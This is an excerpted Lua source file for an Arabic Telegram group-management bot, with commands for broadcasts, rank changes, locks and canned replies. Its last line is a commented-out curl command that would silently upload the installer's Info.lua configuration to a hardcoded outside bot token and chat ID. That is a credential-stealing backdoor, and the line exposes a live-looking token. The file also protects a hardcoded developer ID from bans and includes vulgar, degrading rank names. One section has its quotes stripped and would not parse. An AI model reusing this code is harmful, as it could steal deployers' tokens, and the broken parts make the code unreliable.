...
local NameUser = "🧚‍♀️ بواسطه » ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "🧚‍♀️ اسم المستخدم » ["..data.first_name_.."](T.me/"..UserName..")"
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒃𝒂𝒌𝒂𝒓")  
...
send(msg.chat_id_, msg.id_," 🧚‍♀️ تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
...
{'قناه السورس','بوت تواصل','قائمه العام'},
{'المشتركين','الجروبات '},
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/BK_b_1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '≪━━━━━━𝒃𝒂𝒌𝒂𝒓━━━━━━≫' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/BK_b_1)
]] 
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'🧚‍♀️ لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n🧚‍♀️ تم ازالة » { '..q..' } جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n🧚‍♀️ تم ازالة » {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'🧚‍♀️  عدد الجروبات الان » { '..#group..' }'..DRAGONk..''..DRAGON..'\n🧚‍♀️  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
usertext = '\n 🧚‍♀️ العضو » ['..result.title_..'](t.me/'..(username or 'BK_b_1')..')'
status  = '\n 🧚‍♀️ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🧚‍♀️ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BK_b_1')..') \n 🧚‍♀️ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_," 🧚‍♀️ تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 🧚‍♀️ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_,' 🧚‍♀️ عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
...
send(msg.chat_id_,0," 🧚‍♀️ العضو : {["..data.first_name_.."](T.ME/BK_b_1)}\n 🧚‍♀️ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 🧚‍♀️ عذرا » {["..data.first_name_.."](T.ME/BK_b_1)}\n 🧚‍♀️ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == 'بطوط الغلابه' or text == 'مالك السورس' or text == 'بطوط' then
local Text = [[
مطور سورس بكار
]]
keyboard = {} 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒃𝒂𝒌𝒂𝒓',url="t.me/UU_bh1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓆩𝒕𝒘??𝒔𝒐𝒍𓆪', url="t.me/BK_b_1_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 🧚‍♀️ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'BK_b_1')..') \n 🧚‍♀️ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🧚‍♀️ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BK_b_1')..') \n 🧚‍♀️ تـم قفـل التاك بالكتم ')
end,nil)   
...
if result.sender_user_id_ == tonumber(994455333) then
send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك حظر مطور السورس\n")
return false 
end
...
if result.sender_user_id_ == tonumber(994455333) then
send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك كتم مطور السورس\n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
...
send(msg.chat_id_, msg.id_," 🧚‍♀️ منشئ الجروب » ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 🧚‍♀️ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
status  = '\n 🧚‍♀️ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 🧚‍♀️ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♀️ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
...
send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم تنزيل جميع أولادي')
end
...
if BK_b_1 then
send(msg.chat_id_, msg.id_,'['..BK_b_1..']')
else
send(msg.chat_id_, msg.id_,' 🧚‍♀️ لا تستطيع استخدام البوت \n  🧚‍♀️ يرجى الاشتراك بالقناه اولا \n  🧚‍♀️ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم تنزيل جميع بناتك')
end
if text == ("تاك لبناتي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 🧚‍♀️ قائمة بناتي الجروب \n≪━━━━━━𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← بنتي [@"..username.."]\n"
...
local statuss = '\n 🧚‍♀️ تم رفع رقاصه في الجروب\n 🧚‍♀️ مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♀️ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status = '\n 🧚‍♀️ تم تنزيل رقاصه من الجروب\n 🧚‍♀️ بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم تنزيل جميع الي بقلبك ')
end
if text == ("تاك للبقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 🧚‍♀️ قائمة القلوب في الجروب\n≪━━━━━━𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلبي [@"..username.."]\n"
...
if #list == 0 then
t = " 🧚‍♀️ لا يوجد احد بقلبك نت وحيد اوي😹"
end
send(msg.chat_id_, msg.id_, t)
end
---------
...
send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم تنزيل جميع خنزير')
end
if text == ("تاك للخنازير") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n 🧚‍♀️ قائمة خنازير الجروب \n≪━━━━━━𝒃𝒂𝒌𝒂𝒓━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🧚‍♀️ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'BK_b_1')..')'
local  statuss  = '\n 🧚‍♀️ تم رفع خنزير في الجروب\n 🧚‍♀️ يديني امشي اطلع برا يمعفن'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id.. Zahf:User ..msg.chat_id_)
send(msg.chat_id_, msg.id_,   🧚‍♀️ تم مسح كل الحكاكين )
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id.. Zahf:User ..msg.chat_id_)
t = "\n 🧚‍♀️ قائمة حكاكين الجروب \n≪━━━━━━𝒃𝒂𝒌𝒂𝒓━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext =  \n 🧚‍♀️ العضو » [ ..data.first_name_.. ](t.me/ ..(data.username_ or  BK_b_1 ).. ) 
status  =  \n 🧚‍♀️ تم تنزيل حكاك من الجروب\n 🧚‍♀️ لا يسطت هيفضل حكاك رسمي 
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم مسح جميع المتناكين')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n 🧚‍♀️ قائمة المتناكين الجروب \n≪━━━━━━𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم تنزيل جميع البقرات بالجروب')
end
...
GetWelcome = ' 🧚‍♀️ لم يتم تعيين ترحيب للجروب'
end 
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 🧚‍♀️ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'BK_b_1')..')'..'\n 🧚‍♀️ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/BK_b_1)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/BK_b_1)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/BK_b_1)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/BK_b_1)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/BK_b_1)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/BK_b_1)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/BK_b_1)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/BK_b_1)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/BK_b_1)') 
return false
end
end
end
...
--local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1797771210 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
